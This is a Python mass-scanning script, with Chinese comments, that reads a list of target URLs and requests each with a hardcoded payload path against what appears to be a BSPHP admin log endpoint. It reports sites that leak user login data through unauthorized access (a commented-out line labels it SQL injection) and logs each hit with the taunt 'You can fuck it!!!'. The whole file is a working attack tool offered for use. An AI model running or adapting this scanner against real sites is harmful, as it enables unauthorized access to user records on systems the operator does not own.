import requests
from datetime import datetime
import urllib3

# 屏蔽 "未验证 HTTPS 请求" 的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main(payload: str,vulnerability_type: str,*keywords) -> None:
    file_paths={
        'url':'./url.txt',
        'log':'./log/log.txt',
        'success':'./log/success.txt'
    }
    try:
        with (open(file_paths['url'],'r+') as f,
              open(file_paths['log'],'a+',encoding='utf-8') as log,
              open(file_paths['success'],'a+',encoding='utf-8') as success):
            for line in f:
                #处理url
                url = line.strip()
                if url.startswith('#'):
                    continue
                elif not url.startswith(('http://','https://')):
                    url = f"http://{url}"

                try:
                    response=requests.get(url=url,verify=False,timeout=10)
                    if response.status_code==200:#目标存活
                        url_with_payload=url+payload
                        response_from_url_with_payload=requests.get(url=url_with_payload,verify=False,timeout=10)
                        if all(keyword in response_from_url_with_payload.text for keyword in keywords):#漏洞存在
                            now = datetime.now()
                            print(f"[+] {url} {vulnerability_type}")
                            print("You can fuck it!!!")
                            log.write(f"[+] {url} {vulnerability_type}\t{str(now)}\nYou can fuck it!!!\n")
                            success.write(f"[+] {url} {vulnerability_type}\t{str(now)}\nYou can fuck it!!!\n")
                        else:
                            now = datetime.now()
                            print(f"[-] {url} not {vulnerability_type}")
                            log.write(f"[-] {url} not {vulnerability_type}\t{str(now)}\n")
                    else:
                        print(f"[-] {url} :->{response.status_code}")
                        now = datetime.now()
                        log.write(f"[-] {url} :->{response.status_code}\t{str(now)}\n")
                except requests.exceptions.Timeout as e:#请求超时
                    print(f"[-] {url} request timeout")
                    now = datetime.now()
                    log.write(f"[-] {url} request timeout\t{str(now)}\n")
                except Exception as e:
                    print(f"[-] {url} 异常:->{e}")
                    now = datetime.now()
                    log.write(f"[-] {url} 异常:->{e}\t{str(now)}\n")
    except FileNotFoundError as e:#未找到文件
        print(f"The file \"{e.filename}\" was not found.")
    except Exception as e:
        print(f"异常:->{e}")
        with open(file_paths['log'],'a+',encoding='utf-8') as log:
            now = datetime.now()
            log.write(f"异常:->{e}\t{str(now)}\n")

if __name__ == '__main__':
    payload_content="/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘"
    keyword_content= ('data','key','user','ip')
    #vulnerability_type_content="Vulnerable to SQL injection"
    vulnerability_type_content = "存在未授权访问漏洞"
    main(payload_content,vulnerability_type_content,*keyword_content)